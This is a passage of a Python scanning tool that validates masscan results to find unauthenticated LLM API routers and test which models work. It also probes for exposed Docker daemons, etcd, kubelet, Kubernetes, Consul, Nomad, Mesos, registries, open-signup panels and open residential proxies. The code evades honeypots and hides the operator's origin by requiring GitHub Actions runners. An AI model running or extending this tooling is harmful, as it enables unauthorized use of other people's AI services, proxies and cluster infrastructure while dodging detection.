        async with asyncio.timeout(timeout):
            reader, writer = await asyncio.open_connection(ip, port)
            writer.write(b"CONNECT api.ipify.org:443 HTTP/1.1\r\nHost: api.ipify.org:443\r\n\r\n")
            await writer.drain()
            line = await reader.readline()
            return b" 200 " in line
    except Exception:
        return False
    finally:
        if writer is not None:
            try:
                writer.close()
            except Exception:
                pass


import ipaddress

DATACENTER_KEYWORDS = (
    "alibaba", "alicloud", "aliyun", "tencent", "amazon", "aws", "google", "gcp",
    "microsoft", "azure", "digitalocean", "hetzner", "ovh", "choopa", "vultr",
    "linode", "akamai", "cloudflare", "oracle", "contabo", "ucloud", "huawei",
    "kamatera", "leaseweb", "scaleway", "upcloud", "zenlayer", "cogent",
    "hurricane", "datacamp", "m247", "tzulo", "psychz", "multacom", "colocrossing",
    "frantech", "buyvm", "equinix", "hostinger", "ionos", "racknerd",
)


def _is_valid_public_ip(ip_str: str) -> bool:
    try:
        addr = ipaddress.ip_address(ip_str.strip())
        return addr.is_global and not addr.is_private and not addr.is_loopback and not addr.is_reserved
    except Exception:
        return False


_RUNNER_OWN_IP = None


async def _get_runner_own_ip(session) -> str:
    global _RUNNER_OWN_IP
    if _RUNNER_OWN_IP is not None:
        return _RUNNER_OWN_IP
    try:
        async with asyncio.timeout(2.5):
            async with session.get("http://api.ipify.org/?format=json", timeout=aiohttp.ClientTimeout(total=2.5)) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    if isinstance(d, dict) and d.get("ip"):
                        _RUNNER_OWN_IP = str(d["ip"]).strip()
                        return _RUNNER_OWN_IP
    except Exception:
        pass
    _RUNNER_OWN_IP = ""
    return _RUNNER_OWN_IP


async def _classify_exit_ip(session, scanned_ip: str, exit_ip: str, proto: str, https_connect: bool) -> dict | None:
    """Check whether exit_ip belongs to a residential/mobile ISP vs datacenter hosting.
    Requires a valid global exit_ip and HTTPS CONNECT support for HTTP proxies."""
    if not _is_valid_public_ip(exit_ip):
        return None
    if proto == "http" and not https_connect:
        return None
    own_ip = await _get_runner_own_ip(session)
    if own_ip and exit_ip == own_ip:
        return None
    relayed = (exit_ip != scanned_ip)
    info = {
        "sidecar": "OPEN_FORWARD_PROXY",
        "protocol": proto,
        "https_connect": https_connect,
        "scanned_ip": scanned_ip,
        "exit_ip": exit_ip,
        "relayed_exit": relayed,
    }
    classified = False
    try:
        async with asyncio.timeout(2.5):
            url = f"http://ip-api.com/json/{exit_ip}?fields=status,countryCode,isp,org,as,mobile,proxy,hosting"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=2.5)) as r:
                if r.status == 200:
                    meta = await r.json(content_type=None)
                    if isinstance(meta, dict) and meta.get("status") == "success":
                        is_hosting = bool(meta.get("hosting"))
                        is_mobile = bool(meta.get("mobile"))
                        isp_org = f"{meta.get('isp', '')} {meta.get('org', '')} {meta.get('as', '')}".lower()
                        if any(k in isp_org for k in DATACENTER_KEYWORDS):
                            is_hosting = True
                        info["country"] = meta.get("countryCode")
                        info["isp"] = meta.get("isp")
                        info["asn"] = meta.get("as")
                        info["hosting"] = is_hosting
                        info["mobile"] = is_mobile
                        info["sidecar"] = "OPEN_RESIDENTIAL_PROXY" if (not is_hosting or is_mobile) else "OPEN_DATACENTER_PROXY"
                        classified = True
    except Exception:
        pass

    # Fallback to ipwho.is if ip-api.com rate-limited (45 RPM cap)
    if not classified:
        try:
            async with asyncio.timeout(2.5):
                async with session.get(f"https://ipwho.is/{exit_ip}", timeout=aiohttp.ClientTimeout(total=2.5)) as r2:
                    if r2.status == 200:
                        m2 = await r2.json(content_type=None)
                        if isinstance(m2, dict) and m2.get("success") is True:
                            raw_conn = m2.get("connection")
                            conn_info = raw_conn if isinstance(raw_conn, dict) else {}
                            isp_org = f"{conn_info.get('isp', '')} {conn_info.get('org', '')} {conn_info.get('asn', '')}".lower()
                            is_dc = any(k in isp_org for k in DATACENTER_KEYWORDS)
                            info["country"] = m2.get("country_code")
                            info["isp"] = conn_info.get("isp")
                            info["asn"] = str(conn_info.get("asn", ""))
                            info["hosting"] = is_dc
                            info["sidecar"] = "OPEN_DATACENTER_PROXY" if is_dc else "OPEN_RESIDENTIAL_PROXY"
        except Exception:
            pass
    return info


async def _sidecar_triage(session, ip: str, port: int, base: str) -> dict | None:
    """Sidecar triage for non-LLM high-value infra:
    1. Port 2375 Docker 5-point read-side authenticity gate
    2. Open-signup OneAPI/NewAPI (/api/status) & Open-WebUI (/api/config)
    3. SOCKS5 + HTTP CONNECT egress proxy check (classifying Residential vs Datacenter exit IP)
    """
    if port == 2375 or port == 4243:
        try:
            async with asyncio.timeout(4.0):
                async with session.get(f"{base}/_ping", timeout=aiohttp.ClientTimeout(total=2.5)) as rp:
                    ping_txt = (await rp.text()).strip()
                    srv = rp.headers.get("Server", "")
                    if rp.status != 200 or ping_txt != "OK" or not srv.startswith("Docker/"):
                        return None
                async with session.get(f"{base}/version", timeout=aiohttp.ClientTimeout(total=2.5)) as rv1:
                    v1 = await rv1.json(content_type=None)
                async with session.get(f"{base}/version", timeout=aiohttp.ClientTimeout(total=2.5)) as rv2:
                    v2 = await rv2.json(content_type=None)
                if not isinstance(v1, dict) or not {"Version", "ApiVersion", "Os", "Arch"}.issubset(v1.keys()):
                    return None
                if v1.get("Version") != v2.get("Version") or v1.get("GitCommit") != v2.get("GitCommit"):
                    return None
                async with session.get(f"{base}/nonexistent_9f8a7b", timeout=aiohttp.ClientTimeout(total=2.5)) as rb:
                    if rb.status != 404:
                        return None
                return {"sidecar": "DOCKER_DAEMON_AUTHENTIC", "version": v1.get("Version")}
        except Exception:
            return None

    # etcd client API (k8s/stateful backing store) — keys read = cluster secrets
    if port == 2379:
        for b_url in (base, f"https://{ip}:{port}"):
            try:
                async with asyncio.timeout(4.0):
                    for ep in ("/v3/kv/range", "/v3alpha/kv/range"):
                        async with session.post(
                            f"{b_url}{ep}",
                            json={"key": "AA==", "range_end": "AA==", "count_only": True},
                            timeout=aiohttp.ClientTimeout(total=2.5),
                        ) as rr:
                            if rr.status == 200:
                                d = await rr.json(content_type=None)
                                if isinstance(d, dict) and ("count" in d or "header" in d):
                                    cnt = int(d.get("count", 0) or 0)
                                    ver = ""
                                    try:
                                        async with session.get(f"{b_url}/version", timeout=aiohttp.ClientTimeout(total=2.0)) as rv:
                                            ver = (await rv.text())[:60]
                                    except Exception:
                                        pass
                                    return {"sidecar": "OPEN_ETCD", "keys": cnt, "version": ver}
                    # etcd v2 fallback
                    async with session.get(f"{b_url}/v2/keys/?recursive=false", timeout=aiohttp.ClientTimeout(total=2.5)) as rv2:
                        if rv2.status == 200:
                            d2 = await rv2.json(content_type=None)
                            if isinstance(d2, dict) and isinstance(d2.get("node"), dict):
                                nodes = d2["node"].get("nodes") or []
                                return {"sidecar": "OPEN_ETCD", "keys": len(nodes), "version": "v2"}
            except Exception:
                continue
        return None

    # kubelet API — /pods env dump (10255 read-only HTTP, 10250 full HTTPS with /exec)
    if port in (10250, 10255):
        bases = (f"https://{ip}:{port}", f"http://{ip}:{port}") if port == 10250 else (f"http://{ip}:{port}", f"https://{ip}:{port}")
        for b_url in bases:
            try:
                async with asyncio.timeout(4.0):
                    async with session.get(f"{b_url}/pods", timeout=aiohttp.ClientTimeout(total=2.5)) as rp:
                        if rp.status == 200:
                            d = await rp.json(content_type=None)
                            if isinstance(d, dict) and isinstance(d.get("items"), list):
                                kind = "KUBELET_READONLY" if port == 10255 else "KUBELET_API"
                                return {"sidecar": kind, "pods": len(d["items"]), "scheme": b_url.split("://", 1)[0]}
            except Exception:
                continue
        return None

    # Kubernetes API server — require anonymous RBAC read access on /api/v1/namespaces or /api/v1/pods
    if port == 6443:
        for b_url in (f"https://{ip}:{port}", f"http://{ip}:{port}"):
            try:
                async with asyncio.timeout(4.0):
                    ver_str = None
                    async with session.get(f"{b_url}/version", timeout=aiohttp.ClientTimeout(total=2.5)) as rv:
                        if rv.status == 200:
                            d = await rv.json(content_type=None)
                            if isinstance(d, dict) and "gitVersion" in d:
                                ver_str = d["gitVersion"]
                    for check_ep in ("/api/v1/namespaces", "/api/v1/pods?limit=1"):
                        async with session.get(f"{b_url}{check_ep}", timeout=aiohttp.ClientTimeout(total=2.5)) as ra:
                            if ra.status == 200:
                                da = await ra.json(content_type=None)
                                if isinstance(da, dict) and isinstance(da.get("items"), list):
                                    return {
                                        "sidecar": "K8S_API_SERVER",
                                        "version": ver_str or "unknown",
                                        "anon_api": True,
                                        "endpoint": check_ep,
                                        "items": len(da["items"]),
                                    }
            except Exception:
                continue
        return None

    # Docker Swarm manager API — require unauthenticated /nodes list access
    if port == 2377:
        for b_url in (base, f"https://{ip}:{port}"):
            try:
                async with asyncio.timeout(4.0):
                    async with session.get(f"{b_url}/version", timeout=aiohttp.ClientTimeout(total=2.5)) as rv:
                        if rv.status == 200:
                            d = await rv.json(content_type=None)
                            if isinstance(d, dict) and {"Version", "ApiVersion"}.issubset(d.keys()):
                                async with session.get(f"{b_url}/nodes", timeout=aiohttp.ClientTimeout(total=2.5)) as rn:
                                    if rn.status == 200:
                                        nodes = await rn.json(content_type=None)
                                        if isinstance(nodes, list):
                                            return {"sidecar": "SWARM_MANAGER", "version": d.get("Version"),
                                                    "nodes": len(nodes), "nodes_list": True}
            except Exception:
                continue
        return None

    # HashiCorp Nomad HTTP API — require unauth /v1/jobs list (ACL-locked returns 403)
    if port == 4646:
        for b_url in (base, f"https://{ip}:{port}"):
            try:
                async with asyncio.timeout(4.0):
                    async with session.get(f"{b_url}/v1/agent/health", timeout=aiohttp.ClientTimeout(total=2.5)) as rh:
                        if rh.status == 200:
                            async with session.get(f"{b_url}/v1/jobs", timeout=aiohttp.ClientTimeout(total=2.5)) as rj:
                                if rj.status == 200:
                                    jobs = await rj.json(content_type=None)
                                    if isinstance(jobs, list):
                                        return {"sidecar": "OPEN_NOMAD", "jobs": len(jobs)}
            except Exception:
                continue
        return None

    # Apache Mesos master — unauth framework submit = RCE
    if port == 5050:
        try:
            async with asyncio.timeout(4.0):
                async with session.get(f"{base}/master/state.json", timeout=aiohttp.ClientTimeout(total=2.5)) as rs:
                    if rs.status == 200:
                        d = await rs.json(content_type=None)
                        if isinstance(d, dict) and ("cluster" in d or "slaves" in d or "frameworks" in d):
                            return {"sidecar": "OPEN_MESOS", "cluster": d.get("cluster"),
                                    "agents": len(d.get("slaves") or [])}
        except Exception:
            return None

    # HashiCorp Consul — require unauth KV keys list (ACL-locked returns 403)
    if port == 8500:
        for b_url in (base, f"https://{ip}:{port}"):
            try:
                async with asyncio.timeout(4.0):
                    async with session.get(f"{b_url}/v1/agent/self", timeout=aiohttp.ClientTimeout(total=2.5)) as ra:
                        if ra.status == 200:
                            d = await ra.json(content_type=None)
                            if isinstance(d, dict) and "Config" in d:
                                cfg = (d or {}).get("Config", {})
                                async with session.get(f"{b_url}/v1/kv/?keys", timeout=aiohttp.ClientTimeout(total=2.5)) as rk:
                                    if rk.status == 200:
                                        keys = await rk.json(content_type=None)
                                        if isinstance(keys, list):
                                            return {"sidecar": "OPEN_CONSUL", "datacenter": cfg.get("Datacenter"),
                                                    "kv_keys": len(keys)}
            except Exception:
                continue
        return None

    # Private Docker Registry v2 (commonly on :5000) — check when LLM discovery didn't match
    if port == 5000:
        try:
            async with asyncio.timeout(3.0):
                async with session.get(f"{base}/v2/_catalog", timeout=aiohttp.ClientTimeout(total=2.5)) as rr:
                    if rr.status == 200:
                        d = await rr.json(content_type=None)
                        if isinstance(d, dict) and isinstance(d.get("repositories"), list) and len(d["repositories"]) > 0:
                            return {
                                "sidecar": "OPEN_DOCKER_REGISTRY",
                                "repos": len(d["repositories"]),
                                "sample": d["repositories"][:5],
                            }
        except Exception:
            pass

    if port not in PURE_PROXY_PORTS:
        for p_path, p_kind in (("/api/status", "newapi"), ("/api/config", "open_webui")):
            try:
                async with asyncio.timeout(2.5):
                    async with session.get(f"{base}{p_path}", timeout=aiohttp.ClientTimeout(total=2.5)) as r:
                        if r.status == 200:
                            d = await r.json(content_type=None)
                            if isinstance(d, dict):
                                raw_inner = d.get("data")
                                inner = raw_inner if isinstance(raw_inner, dict) else d
                                if p_kind == "newapi" and inner.get("register_enabled") is True and not inner.get("turnstile_check"):
                                    return {"sidecar": "OPEN_SIGNUP_NEWAPI", "system_name": inner.get("system_name")}
                                if p_kind == "open_webui" and inner.get("enable_signup") is True:
                                    return {"sidecar": "OPEN_SIGNUP_WEBUI", "name": inner.get("name")}
            except Exception:
                pass

    if port in PROXY_CANDIDATE_PORTS:
        # 1. Try SOCKS5 no-auth tunnel first on SOCKS/Mixed ports (Clash 7890, v2ray 10808, Sing-box 2080, SOCKS 1080)
        if port in (1080, 1081, 2080, 7890, 7891, 9050, 10808):
            s5_exit = await _probe_socks5_exit(ip, port, timeout=3.0)
            if s5_exit:
                return await _classify_exit_ip(session, ip, s5_exit, proto="socks5", https_connect=True)
        # 2. Try HTTP forward proxy + verify HTTPS CONNECT (port 443)
        try:
            async with asyncio.timeout(3.0):
                async with session.get("http://api.ipify.org/?format=json", proxy=f"http://{ip}:{port}",
                                       timeout=aiohttp.ClientTimeout(total=3.0, connect=1.5)) as rp:
                    if rp.status == 200:
                        pd = await rp.json(content_type=None)
                        if isinstance(pd, dict) and pd.get("ip"):
                            can_connect = await _probe_http_connect_tunnel(ip, port, timeout=2.5)
                            return await _classify_exit_ip(session, ip, str(pd["ip"]), proto="http", https_connect=can_connect)
        except Exception:
            pass
    return None


async def validate_host(session, host, timeout, max_models, sem, ledger_fp=None, ledger_lock=None, prior_alive=None):
    if ":" not in host:
        result = {"host": host, "tier": "DEAD", "error": "invalid_format", "working_models": []}
        _ledger_write(ledger_fp, ledger_lock, result)
        return result

    ip, port_str = host.rsplit(":", 1)
    try:
        port = int(port_str)
    except ValueError:
        result = {"host": host, "tier": "DEAD", "error": "invalid_port", "working_models": []}
        _ledger_write(ledger_fp, ledger_lock, result)
        return result

    # Zero-Ollama Guard (bypass with --include-ollama)
    if port == 11434:
        result = {"host": host, "tier": "FILTERED_OLLAMA", "error": "ollama_excluded", "working_models": []}
        _ledger_write(ledger_fp, ledger_lock, result)
        return result

    scheme = "https" if port in (443, 8443, 6443, 10250, 2376, 2053, 2083, 2087, 2096) else "http"
    base = f"{scheme}://{ip}:{port}"
    host_t0 = time.time()
    async with sem:
        # Fast-path pure proxy/tunnel ports (1080, 7890, 10808, 3128, etc.) straight to proxy triage
        if port in PURE_PROXY_PORTS or port in CONTROL_PLANE_PORTS:
            sidecar = await _sidecar_triage(session, ip, port, base)
            result = {"host": host, "tier": sidecar["sidecar"] if sidecar else "DEAD",
                      "error": "pure_proxy_port" if port in PURE_PROXY_PORTS else "control_plane_port",
                      "sidecar": sidecar, "working_models": []}
            _ledger_write(ledger_fp, ledger_lock, result)
            return result

        # Step 1: Probe all candidate paths simultaneously via asyncio.gather!
        path_tasks = [probe_path_fast(session, base, m_p, c_p) for m_p, c_p in CANDIDATE_PATHS]
        path_results = await asyncio.gather(*path_tasks)

        discovered = next((res for res in path_results if res), None)

        # TLS Fallback: if plain HTTP failed on a non-443 port, try https:// if port is 8443/443 or dual-stack
        if not discovered and scheme == "http" and port in (3000, 3001, 4000, 8000, 8080, 8443):
            https_base = f"https://{ip}:{port}"
            https_results = await asyncio.gather(*(probe_path_fast(session, https_base, m_p, c_p) for m_p, c_p in CANDIDATE_PATHS[:2]))
            https_disc = next((res for res in https_results if res), None)
            if https_disc:
                base = https_base
                discovered = https_disc

        if not discovered:
            sidecar = await _sidecar_triage(session, ip, port, base)
            result = {"host": host, "tier": sidecar["sidecar"] if sidecar else "DEAD",
                      "error": "no_models_endpoint_responsive", "sidecar": sidecar, "working_models": []}
            _ledger_write(ledger_fp, ledger_lock, result)
            return result

        if len(discovered) == 4:
            discovered_path, discovered_chat, raw_models, auth_headers = discovered
        else:
            discovered_path, discovered_chat, raw_models = discovered
            auth_headers = None

        # Filter to chat models only and priority-sort frontier/tea-channel aliases first!
        chat_models = [m for m in raw_models if is_chat_model(m)]
        if not chat_models:
            chat_models = raw_models  # fallback if all got filtered
        chat_models = sort_models_by_priority(chat_models)

        # Y6 (2026-10-26): resume — carry previously-ALIVE models forward and spend this
        # pass's budget on the tail a prior pass never reached. Failed models are NOT
        # skipped, so a transient timeout is re-attempted on every pass.
        reused, models_to_test = resume_plan(chat_models, prior_alive or {}, max_models)

        # Step 2: adaptive in-host concurrency (MODEL_SEM_START → MODEL_SEM_MAX once the
        # host proves fast and 429-free; a slow/throttled router keeps the safe width).
        model_sem = AdaptiveSem(MODEL_SEM_START, MODEL_SEM_MAX, MODEL_SEM_FAST_S)
        active_host_chat = [discovered_chat]
        async def run_m(m):
            async with model_sem:
                t_m = time.time()
                r = await validate_model(session, base, active_host_chat[0], m, timeout, headers=auth_headers)
                rcp = (r.get("checks") or {}).get("resolved_chat_path")
                if rcp and active_host_chat[0] == discovered_chat:
                    active_host_chat[0] = rcp
                model_sem.observe(time.time() - t_m, hit_429="429_active_relay" in str(r.get("checks") or {}))
                return r

        # Host-level total budget — collect partial results even on timeout
        results = list(reused)
        try:
            async with asyncio.timeout(HOST_BUDGET):
                async def collect(m):
                    r = await run_m(m)
                    results.append(r)
                    return r
                await asyncio.gather(*(collect(m) for m in models_to_test))
        except asyncio.TimeoutError:
            # Budget exhausted — the untouched tail stays HOST_BUDGET_EXHAUSTED and is
            # re-queued by the NEXT pass (resume skips only models that proved ALIVE).
            for m in models_to_test:
                if not any(r.get("model") == m for r in results):
                    results.append({"model": m, "score": 0, "tier": "HOST_BUDGET_EXHAUSTED", "checks": {}})

        working = [r for r in results if r["tier"] in ("GOLD", "SILVER")]
        # Host-level Honeypot Poison Pill (2026-11-06):
        # Multi-port honeypots advertise gpt-4o alongside claude-opus-5-5:latest.
        # If ANY model on the host confesses a rotating honeypot signature (Open WebUI,
        # LiteLLM, KoboldCpp, text-generation-webui, AnythingLLM, LM Studio, vLLM, LocalAI),
        # poison the entire host so sibling models on the same honeypot are never wired.
        honeypot_hits = [
            r for r in results
            if r.get("tier") == "FAKE_HONEYPOT" or (r.get("checks") or {}).get("honeypot_detected")
        ]
        if honeypot_hits:
            hp_reason = (honeypot_hits[0].get("checks") or {}).get("honeypot_detected") or "honeypot_host"
            for r in working:
                r["tier"] = "FAKE_HONEYPOT_SIBLING"
                r["score"] = 0
                if isinstance(r.get("checks"), dict):
                    r["checks"]["host_honeypot_poisoned"] = hp_reason
            working = []
        # Cross-model byte-identical replay guard (model-authenticity-triage Rule #5):
        # If >=3 models on the same host return the exact same non-empty creative prose sample
        # (never code like fizzbuzz, which can canonically match), the host is a canned stub.
        if len(working) >= 3:
            samples = [str((r.get("checks") or {}).get("creative_sample") or "").strip() for r in working]
            non_empty_samples = [s for s in samples if len(s) >= 12]
            if len(non_empty_samples) >= 3 and len(set(non_empty_samples)) == 1:
                for r in working:
                    r["tier"] = "FAKE_CANNED_STUB"
                    r["score"] = 0
                    if isinstance(r.get("checks"), dict):
                        r["checks"]["cross_model_identical_replay"] = True
                working = []
        snapped = [r for r in results if r["tier"].startswith("SNAPPED_")]
        partial = [r for r in results if r["tier"] == "EMPTY_CONTENT_ALIVE"]
        exhausted = [r for r in results if r["tier"] == "HOST_BUDGET_EXHAUSTED"]

        if honeypot_hits:
            host_tier = "FAKE_HONEYPOT_HOST"
        elif any(r["tier"] == "GOLD" for r in results):
            host_tier = "GOLD"
        elif working:
            host_tier = "SILVER"
        elif snapped and len(snapped) == len(results):
            host_tier = "SNAPPED_4XX_HOST"
        else:
            host_tier = "FAKE"

        # 2026-10-09: gateway-behaviour signals. These are what the payload triage
        # found on the wired fleet — injected system prompts, injected toolsets,
        # injected personas and owner-ID leaks. Capture them at discovery time so a
        # suspicious host is FLAGGED rather than silently wired.
        sig_tools, sig_sys, sig_leak, sig_persona = set(), [], False, []
        for r in results:
            ch = r.get("checks") or {}
            for t in (ch.get("injected_tools") or []):
                sig_tools.add(t)
            pt = ch.get("prompt_tokens")
            if isinstance(pt, int) and pt > 60:
                sig_sys.append(pt)
        for r in results:
            ch = r.get("checks") or {}
            if ch.get("header_leak"):
                sig_leak = True
        joined = " ".join(
            str((r.get("checks") or {}).get("sample") or "") for r in results
        ).lower()
        for mark in INJECTED_PERSONA_MARKERS:
            if mark in joined:
                sig_persona.append(mark)
        gateway_signals = {
            "injected_tools": sorted(sig_tools)[:8],
            "sysprompt_tokens": max(sig_sys) if sig_sys else None,
            "header_leak": sig_leak,
            "injected_persona": sig_persona,
        }

        out_obj = {
            "host": host,
            "ip": ip,
            "port": port,
            "endpoint_path": discovered_path,
            "chat_path": active_host_chat[0],
            "tier": host_tier,
            "total_models": len(raw_models),
            "tested_models_count": len(results),
            "working_models_count": len(working),
            "working_models": working,
            "partial_models": partial,
            "all_results": results,
            "gateway_signals": gateway_signals,
            # AC-1 evidence: coverage = (models with a verdict this pass) / (advertised chat
            # models). Resume carries prior-ALIVE rows, so coverage climbs pass over pass
            # until it reaches 1.0 on a dense router.
            "advertised_chat": len(chat_models),
            "tested_model_ids": [r.get("model") for r in results],
            "reused_from_ledger": len(reused),
            "budget_exhausted": len(exhausted),
            "coverage": round(len({r.get("model") for r in results}) / max(len(chat_models), 1), 4),
            "elapsed_s": round(time.time() - host_t0, 2)
        }

        # Real-time stdout logging!
        if host_tier in ("GOLD", "SILVER"):
            flag = "👑" if host_tier == "GOLD" else "🥈"
            cov = len({r.get("model") for r in results})
            print(f"{flag} {host:22} {host_tier:8} working={len(working)}/{len(raw_models)} "
                  f"coverage={cov}/{len(chat_models)} reused={len(reused)} partial={len(partial)} "
                  f"({[m['model'] for m in working][:3]})", flush=True)

        _ledger_write(ledger_fp, ledger_lock, out_obj)
        return out_obj


def _ledger_write(ledger_fp, ledger_lock, record):
    """Append one host result to the JSONL ledger immediately (atomic per record)."""
    if ledger_fp is None:
        return
    line = json.dumps(record, ensure_ascii=False) + "\n"
    if ledger_lock:
        ledger_lock.acquire()
    try:
        ledger_fp.write(line)
        ledger_fp.flush()
    finally:
        if ledger_lock:
            ledger_lock.release()


async def main():
    ap = argparse.ArgumentParser(description="Turbo Hardened Multi-Model Router Validator")
    ap.add_argument("--hosts", required=True, help="Comma-separated host:port list, path to hosts file, or path to masscan -oJ JSON")
    ap.add_argument("--models", type=int, default=25, help="Max models to test per host (0=ALL, default: 25)")
    ap.add_argument("--workers", type=int, default=32, help="Concurrent host workers (default: 32)")
    ap.add_argument("--timeout", type=float, default=10.0, help="Per-request timeout seconds")
    ap.add_argument("--include-ollama", action="store_true", help="Include port 11434 (default: filtered)")
    ap.add_argument("--force-bare-host", action="store_true", help="Explicitly allow running directly on bare host (DANGEROUS)")
    ap.add_argument("-o", "--out", default="validate_v2_results.json", help="Output JSON path")
    args = ap.parse_args()

    # Operator Egress Guard: Never run bulk scan validation on bare residential host!
    if not os.environ.get("GITHUB_ACTIONS") and not args.force_bare_host:
        sys.exit(
            "🚨 FATAL OPERATOR SAFETY VIOLATION: validate_v2.py must run on GitHub Actions hosted runners,\n"
            "NOT directly on the bare residential host! Running this locally burns the operator's home IP.\n"
            "If you intentionally want to test a single host locally, pass --force-bare-host."
        )

    hosts_input = args.hosts.strip()

    # Universal loader: masscan -oJ JSON array, line-delimited ip:port, or comma-separated
    if os.path.isfile(hosts_input):
        raw = open(hosts_input).read().strip()
        if raw.startswith("["):
            # masscan -oJ format
            hits = json.loads(raw)
            hosts = []
            for h in hits:
                ip = h.get("ip", "")
                for p in h.get("ports", []):
                    pnum = p.get("port") if isinstance(p, dict) else p
                    if pnum:
                        hosts.append(f"{ip}:{pnum}")
        else:
            hosts = [line.strip() for line in raw.splitlines() if line.strip() and not line.startswith("#")]
    else:
        hosts = [h.strip() for h in hosts_input.replace("\n", ",").split(",") if h.strip()]

    # Filter out Ollama port 11434 unless --include-ollama
    if args.include_ollama:
        filtered_hosts = hosts
    else:
        filtered_hosts = [h for h in hosts if not h.endswith(":11434")]
    dropped_ollama = len(hosts) - len(filtered_hosts)
    if dropped_ollama > 0:
        print(f"🛡️ Pre-filtered {dropped_ollama} Ollama hosts (:11434). Remaining: {len(filtered_hosts)}", flush=True)

    print(f"🚀 Starting Turbo Validator on {len(filtered_hosts)} hosts with {args.workers} workers (models_cap={args.models})...", flush=True)
    t0 = time.time()

    # JSONL ledger for incremental results
    ledger_path = args.out.replace(".json", ".jsonl") if args.out.endswith(".json") else args.out + ".jsonl"

    # Y6 resume (2026-10-26): an existing ledger for this --out means a prior pass ran here.
    # Carry its ALIVE rows forward so this pass's budget goes to the tail that pass never reached.
    prior = {}
    if os.path.exists(ledger_path) and os.path.getsize(ledger_path) > 0:
        with open(ledger_path) as fp_prev:
            for line in fp_prev:
                try:
                    rec = json.loads(line)
                except Exception:
                    continue
                alive = {r.get("model"): r for r in (rec.get("all_results") or [])
                         if r.get("tier") in ("GOLD", "SILVER") and r.get("model")}
                if alive:
                    prior[rec.get("host")] = alive
        print(f"♻️  Resume: {len(prior)} host(s) carry prior-ALIVE models (not re-tested)", flush=True)

    ledger_fp = open(ledger_path, "a")
    import threading
    ledger_lock = threading.Lock()

    sem = asyncio.Semaphore(args.workers)
    conn = aiohttp.TCPConnector(limit=args.workers * 4, ttl_dns_cache=300, ssl=False)
    async with aiohttp.ClientSession(connector=conn) as session:
        out = await asyncio.gather(*(validate_host(session, h, args.timeout, args.models, sem, ledger_fp, ledger_lock, prior.get(h)) for h in filtered_hosts))

    elapsed = time.time() - t0
    ledger_fp.close()
    with open(args.out, "w") as fp:
        json.dump(out, fp, indent=2)

    from collections import Counter
    counts = dict(Counter(r["tier"] for r in out))
    print(f"\n✨ Completed in {elapsed:.1f}s ({len(filtered_hosts)/max(elapsed, 0.1):.1f} hosts/s)")
    print(f"📊 Host Tiers Summary: {counts}", flush=True)
    if prior:
        print(f"♻️  Resumed hosts: {len(prior)} (prior-ALIVE models carried forward, not re-tested)", flush=True)
    full = sum(1 for r in out if r.get("coverage", 0) >= 0.999)
    print(f"🎯 Full-coverage hosts: {full}/{len(out)}; budget-exhausted models: "
          f"{sum(r.get('budget_exhausted', 0) for r in out)}", flush=True)
    print(f"📋 Incremental ledger: {ledger_path}", flush=True)

if __name__ == "__main__":
    asyncio.run(main())
